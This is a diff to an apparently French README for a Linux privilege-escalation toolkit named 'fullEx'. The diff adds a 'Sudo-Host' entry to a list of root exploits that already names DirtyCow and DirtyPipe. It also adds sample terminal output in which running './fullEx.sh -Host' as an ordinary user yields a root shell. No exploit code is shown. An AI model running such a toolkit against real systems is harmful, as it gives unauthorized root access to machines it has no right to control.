@@ -3,6 +3,8 @@
 
 Les exploits root & outils dispo :
 
+💀 Sudo-Host
+
 💀 DirtyCow
 
 💀 DirtyPipe
@@ -203,4 +205,11 @@ sh: 0: can't access tty; job control turned off
 bash: cannot set terminal process group (907): Inappropriate ioctl for device
 bash: no job control in this shell
 root@droopy:/tmp/fullEx# 
+```
+## 💀 Sudo-Host
+
+```
+ubuntu@ubuntuserver2204:~/fullEx$ ./fullEx.sh -Host
+sudo: unable to resolve host dev.test.local: Temporary failure in name resolution
+root@ubuntuserver2204:~#
 ```
